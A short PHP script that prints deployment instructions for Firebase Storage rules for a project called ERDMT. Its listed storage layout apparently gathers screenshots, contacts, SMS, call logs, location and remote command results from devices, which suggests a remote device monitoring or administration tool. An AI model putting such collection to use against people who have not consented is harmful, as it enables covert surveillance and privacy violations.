<?php
/**
 * Deploy Firebase Storage Rules for ERDMT
 * This script helps deploy storage rules to Firebase
 */

require_once 'firebase_config.php';

echo "🔐 Firebase Storage Rules Deployment Tool for ERDMT\n";
echo "==================================================\n\n";

// Read the storage rules file
$rulesFile = __DIR__ . '/firebase-storage-rules.txt';
if (!file_exists($rulesFile)) {
    die("❌ Storage rules file not found: $rulesFile\n");
}

$rules = file_get_contents($rulesFile);
echo "📋 Storage Rules Content:\n";
echo $rules . "\n\n";

echo "📝 To deploy these Firebase Storage rules:\n\n";

echo "1. 🌐 Go to Firebase Console:\n";
echo "   https://console.firebase.google.com/project/remoteadmin-a1089/storage/rules\n\n";

echo "2. 📋 Copy and paste the rules from: firebase-storage-rules.txt\n\n";

echo "3. ✅ Click 'Publish' to deploy the rules\n\n";

echo "🔗 Alternative: Use Firebase CLI:\n";
echo "   firebase deploy --only storage\n\n";

// Test storage structure
echo "📁 Expected Storage Structure:\n";
echo "/screenshots/{deviceId}/{timestamp}-screenshot.png\n";
echo "/device_data/{deviceId}/{timestamp}-contacts.json\n";
echo "/sms/{deviceId}/{timestamp}-sms.json\n";
echo "/call_logs/{deviceId}/{timestamp}-calls.json\n";
echo "/app_lists/{deviceId}/{timestamp}-apps.json\n";
echo "/location/{deviceId}/{timestamp}-location.json\n";
echo "/system_info/{deviceId}/{timestamp}-system.json\n";
echo "/admin_uploads/{deviceId}/{filename}\n";
echo "/command_results/{deviceId}/{commandId}/{result}\n";
echo "/logs/{deviceId}/{timestamp}-log.txt\n";
echo "/archive/{deviceId}/{date}-backup.zip\n";
echo "/temp/{deviceId}/{timestamp}-temp.dat\n\n";

echo "🔧 Storage Configuration:\n";
echo "- Max screenshot size: 10MB\n";
echo "- Max data file size: 5MB\n";
echo "- Max admin upload: 50MB\n";
echo "- Max archive size: 100MB\n";
echo "- Allowed image types: image/*\n";
echo "- Allowed data types: JSON, CSV, TXT\n\n";

echo "✅ Deploy these rules to enable file upload functionality in ERDMT.\n";
?>